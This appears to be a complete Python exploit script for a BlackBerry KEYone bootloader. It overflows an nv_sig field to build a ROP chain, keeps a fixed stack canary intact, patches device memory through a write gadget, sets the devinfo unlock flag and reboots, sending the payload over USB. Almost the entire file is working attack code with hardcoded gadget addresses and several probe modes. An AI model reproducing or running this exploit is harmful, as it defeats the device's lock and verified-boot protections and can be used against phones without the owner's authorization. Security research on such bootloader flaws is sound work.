#!/usr/bin/env python3
"""auth_unlock.py - KEYone ABL766 pre-auth unlock exploit (ROP via nv_sig overflow).

Chain:
  overflow -> saved PC = gadget 0x8f63a03c (str r5,[r8,#0x758] + canary check)
    r5 = 0xE1A00000 (NOP), r8 = 0x8f62c4bc-0x758  -> patches the `bne` in
    set_device_unlock (0x8f62c4bc) to NOP
  -> pc = cmd_oem_unlock (0x8f62c55c): mov r0,#0; mov r1,#1; b set_device_unlock
     with the bne NOPed -> set_device_unlock(0,1) falls through to
     set_device_unlock.part.5(0,1) -> writes is_unlocked=1 (+0x10),
     write_device_info (TZ/RPMB), reboot.

Usage: py -3.11 auth_unlock.py            # run exploit
       py -3.11 auth_unlock.py dryrun     # print payload only
"""
import os, sys, time, struct
for _d in (r"C:\bb10mt", os.path.dirname(os.path.abspath(__file__))):
    try: os.add_dll_directory(_d)
    except Exception: pass
import usb.core, usb.util, usb.backend.libusb1 as lb

COOKIE = 0xbba78701
GUARD_PTR = 0x8F7C2ED0      # address holding the fixed canary 0x54
CANARY = 0x00000054
NOP = 0xE1A00000
GADGET_WRITE = 0x8F63A03C   # ldr r2,[sp,#4]; ldr r3,[r7]; str r5,[r8,#0x758]; cmp; bne; add sp,#8; pop {r4,r5,r6,r7,r8,pc}
DEVINFO_BASE = 0x8F7944D4   # devinfo struct; +0x10 = is_unlocked
PART5_WRITE_INFO = 0x8F62C3F8  # mid-entry of set_device_unlock.part.5: movw r0,#0x44d4; ...; bl write_device_info; ...; reboot
CMD_OEM_UNLOCK = 0x8F62C55C # mov r0,#0; mov r1,#1; b set_device_unlock (legacy path)

def fr(code, payload=b""): return struct.pack("<II", COOKIE, code) + payload

def hs_frame():
    return fr(0x2000, struct.pack("<I", 0x00010003) + b"Linux" + struct.pack("<I", 0x78) + b"\x00" * 8)

def nvinit_frame():
    p = bytearray(b"\x00" * 0x124)
    p[0:8] = b"nvitem\x00\x00"
    p[0x20:0x28] = b"signit\x00\x00"
    p[0x120:0x124] = struct.pack("<I", 1)
    return fr(0x1016, bytes(p))

def w32(buf, off, val):
    buf[off:off+4] = struct.pack("<I", val)

RAW_REBOOT = 0x8F629568       # prints "rebooting the device" + raw reboot (no event log)
FB_UI_REBOOT = 0x8F63EB48     # fboot_ui_reboot_fastboot (calls event logger - avoid)

def build_chal(mode="unlock"):
    sl = 0xE0
    img = bytearray(b"\x41" * sl)
    # canary slot (buffer+0x88) must end up 0x54 00 00 00 after reversal
    w32(img, 0x88, CANARY)
    if mode == "diag":
        wval = 0x12345678
        wtgt = DEVINFO_BASE + 0x24      # harmless unused field
        endpc = RAW_REBOOT
    elif mode == "reboot":
        wval = 0x41414141
        wtgt = DEVINFO_BASE + 0x24
        endpc = RAW_REBOOT
    elif mode == "spin":
        wval = 0x41414141
        wtgt = DEVINFO_BASE + 0x24
        endpc = 0x8F600110               # self-branch infinite loop
    elif mode == "spin2":
        wval = 0x12345678
        wtgt = DEVINFO_BASE + 0x24       # harmless write via gadget
        endpc = 0x8F600110               # then spin
    elif mode == "reboot2":
        wval = 0x41414141
        wtgt = DEVINFO_BASE + 0x24
        endpc = 0x8F600020               # reset vector (warm bootloader re-init)
    else:
        wval = 0x00000001               # is_unlocked = 1
        wtgt = DEVINFO_BASE + 0x10
        endpc = PART5_WRITE_INFO        # write_device_info + reboot
    # registers restored by the vulnerable function's epilogue:
    # r4..fp at 0x90..0xac, pc at 0xb0
    w32(img, 0x90, 0x41414141)        # r4
    w32(img, 0x94, wval)              # r5 = value to write
    w32(img, 0x98, 0x41414141)        # r6
    w32(img, 0x9C, GUARD_PTR)         # r7 = guard pointer
    w32(img, 0xA0, wtgt - 0x758)      # r8 = target - 0x758
    w32(img, 0xA4, 0x41414141)        # sb
    w32(img, 0xA8, 0x41414141)        # sl
    w32(img, 0xAC, 0x41414141)        # fp
    if mode in ("reboot", "spin"):
        w32(img, 0xB0, endpc)         # stage-1: PC control only, straight to target
    else:
        w32(img, 0xB0, GADGET_WRITE)  # pc -> write gadget
    # gadget ROP stack (sp_new = buffer+0xB4)
    w32(img, 0xB4, 0x41414141)        # sp+0
    w32(img, 0xB8, CANARY)            # sp+4 = canary for gadget
    w32(img, 0xBC, 0x41414141)        # r4
    w32(img, 0xC0, 0x41414141)        # r5
    w32(img, 0xC4, 0x41414141)        # r6
    w32(img, 0xC8, 0x41414141)        # r7
    w32(img, 0xCC, 0x41414141)        # r8
    w32(img, 0xD0, endpc)             # pc -> persist+reboot / diag reboot
    # after reversal, data[i] lands at buffer[sl-1-i]
    data = bytes(img[::-1])
    # self-check: simulate memcpy(data)->buffer + in-place reversal
    buf = bytearray(data)
    buf.reverse()
    assert bytes(buf) == bytes(img), "reversal simulation mismatch"
    assert struct.unpack("<I", buf[0x88:0x8C])[0] == CANARY, "canary slot wrong"
    assert struct.unpack("<I", buf[0xB0:0xB4])[0] == (endpc if mode in ("reboot", "spin") else GADGET_WRITE), "pc slot wrong"
    assert struct.unpack("<I", buf[0xB8:0xBC])[0] == CANARY, "gadget canary slot wrong"
    blob = bytearray()
    blob += b"\x30\x81"
    blob += bytes([(sl + 8) - 3])       # L = len_b-3
    blob += b"\x02" + bytes([sl])
    blob += data
    blob += b"\x02\x01\x00"
    len_b = len(blob)
    data_a = b"\x00\x05\x00\x06"
    len_a = len(data_a)
    payload = struct.pack("<IHH", 0, len_a, len_b) + data_a + bytes(blob)
    return fr(0x2005, payload)

def build_ladder(sl, pc):
    """sl-ladder probe: only the canary is controlled; regs/PC are 0x41 or pc."""
    img = bytearray(b"\x41" * sl)
    w32(img, 0x88, CANARY)          # canary slot (if sl >= 0x8C)
    if pc and sl >= 0xB4:
        w32(img, 0xB0, pc)          # saved PC
    data = bytes(img[::-1])
    buf = bytearray(data)
    buf.reverse()
    assert bytes(buf) == bytes(img)
    blob = bytearray()
    blob += b"\x30\x81"
    blob += bytes([(sl + 8) - 3])
    blob += b"\x02" + bytes([sl])
    blob += data
    blob += b"\x02\x01\x00"
    len_b = len(blob)
    data_a = b"\x00\x05\x00\x06"
    len_a = len(data_a)
    payload = struct.pack("<IHH", 0, len_a, len_b) + data_a + bytes(blob)
    return fr(0x2005, payload)

def main():
    arg = sys.argv[1] if len(sys.argv) > 1 else "unlock"
    if arg == "dryrun":
        print(f"payload {len(build_chal('unlock'))} bytes: {build_chal('unlock').hex()}")
        return 0
    mode = arg if arg in ("diag", "unlock", "reboot", "reboot2", "spin", "spin2", "ladder") else "unlock"
    if mode == "ladder":
        # argv[2] = sl hex, argv[3] = pc hex (or 0 = leave untouched/0x41)
        sl = int(sys.argv[2], 16)
        pc = int(sys.argv[3], 16) if len(sys.argv) > 3 else 0
        chal = build_ladder(sl, pc)
        print(f"[*] mode = ladder sl={sl:#x} pc={pc:#x}")
    else:
        chal = build_chal(mode)
    print(f"[*] mode = {mode}")
    backend = lb.get_backend(find_library=lambda x: r"C:\bb10mt\libusb-1.0.dll")
    d = usb.core.find(idVendor=0x0FCA, idProduct=0x8040, backend=backend)
    if d is None:
        print("device not found (bootloader mode required)"); return 2
    for i in (0, 1):
        try:
            if d.is_kernel_driver_active(i): d.detach_kernel_driver(i)
        except Exception: pass
    usb.util.claim_interface(d, 0); usb.util.claim_interface(d, 1)

    def rd(sec):
        t0 = time.time()
        while time.time() - t0 < sec:
            for ep, tag in ((0x82, "AUTH"), (0x81, "FB")):
                try:
                    b = d.read(ep, 4096, timeout=200).tobytes()
                    print(f"  [{tag}] {len(b)} {b[:64].hex()}")
                except usb.core.USBTimeoutError:
                    pass
            time.sleep(0.02)

    print("[*] handshake"); d.write(0x02, hs_frame()); rd(1.5)
    print("[*] 0x1016 nvinit"); d.write(0x02, nvinit_frame()); rd(1.5)
    print(f"[*] 0x2005 UNLOCK payload: {len(chal)} bytes"); d.write(0x02, chal)
    print("[*] sent - device should write unlock state and reboot")
    rd(6)
    usb.util.release_interface(d, 1); usb.util.release_interface(d, 0)
    return 0

if __name__ == "__main__":
    sys.exit(main())
